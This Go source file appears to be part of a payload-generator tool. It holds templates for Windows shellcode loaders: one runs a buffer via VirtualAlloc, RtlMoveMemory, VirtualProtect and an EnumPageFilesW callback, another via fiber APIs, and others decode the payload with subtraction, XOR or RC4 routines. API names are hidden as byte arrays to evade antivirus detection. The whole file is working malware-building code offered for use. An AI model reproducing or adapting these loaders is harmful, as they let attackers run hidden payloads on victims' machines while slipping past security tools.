package help

//Source Code
var GoCode = []byte(`package main

import (
	"syscall"
	"unsafe"
	<<Extra>>
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_READWRITE = 0x04
	PAGE_EXECUTE           = 0x00000010
)

<<ShellCode>>

func main() {
	kernel32 := syscall.NewLazyDLL(string([]byte{107, 101, 114, 110, 101, 108, 51, 50}))
	psapi := syscall.NewLazyDLL(string([]byte{112, 115, 97, 112, 105}))
	EnumPageFilesW := psapi.NewProc(string([]byte{69, 110, 117, 109, 80, 97, 103, 101, 70, 105, 108, 101, 115, 87}))

	RtlMoveMemory := kernel32.NewProc(string([]byte{82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121}))
	VirtualAlloc := kernel32.NewProc(string([]byte{86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99}))
	VirtualProtect := kernel32.NewProc(string([]byte{86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116}))
	
	<<Dec>>

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(buf)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != syscall.Errno(0) {
		panic(err)
	}
	_, _, err =  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if err != syscall.Errno(0) {
		panic(err)
	}

	var OldProtect uintptr
	_, _, err = VirtualProtect.Call(addr, uintptr(len(buf)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&OldProtect)))
	if err != syscall.Errno(0) {
		panic(err)
	}

	EnumPageFilesW.Call(addr,0)	
}
`)

var Fiber = []byte(`package main

import (
	"syscall"
	"unsafe"
	<<Extra>>
)

var (
	K32                  = syscall.NewLazyDLL(string([]byte{107, 101, 114, 110, 101, 108, 51, 50}))
	VirtualAlloc         = K32.NewProc(string([]byte{86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99}))
	CreateFiber          = K32.NewProc(string([]byte{67, 114, 101, 97, 116, 101, 70, 105, 98, 101, 114}))
	SwitchToFiber        = K32.NewProc(string([]byte{83, 119, 105, 116, 99, 104, 84, 111, 70, 105, 98, 101, 114}))
	ConvertThreadToFiber = K32.NewProc(string([]byte{67, 111, 110, 118, 101, 114, 116, 84, 104, 114, 101, 97, 100, 84, 111, 70, 105, 98, 101, 114}))
)

const (
	MEM_COMMIT             = 0x00001000
	PAGE_EXECUTE_READWRITE = 0x40
	MEM_RESERVE            = 0x3000
)

<<ShellCode>>


func main() {
	<<Dec>>

	Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(buf)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	Memcpy(Addr, buf)
	ConvertThreadToFiber.Call(0)
	NewFiber, _, _ := CreateFiber.Call(0, Addr, 0)
	SwitchToFiber.Call(NewFiber)
}

func Memcpy(Base uintptr, Buf []byte) {
	for i := 0; i  < len( Buf ) ; i++ {
		*(*byte)(unsafe.Pointer(Base + uintptr(i))) = Buf[i]
	}
}
`)
var Desofuscate = []byte(`

for i := range buf {
	buf[i] -= <<N>>
}

`)

var XorTemplate = []byte(`

func xor(input, key []byte) (output []byte) {
	output = make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key[i%len(key)]
	}
	return output
}

`)

var Rc4Template = []byte(`

func dec(shellcode, key []byte) []byte {
	c, err := rc4.NewCipher(key)
	if err != nil {
		panic(err)
	}
	dst := make([]byte, len(shellcode))
	c.XORKeyStream(dst, shellcode)
	return dst
}

`)
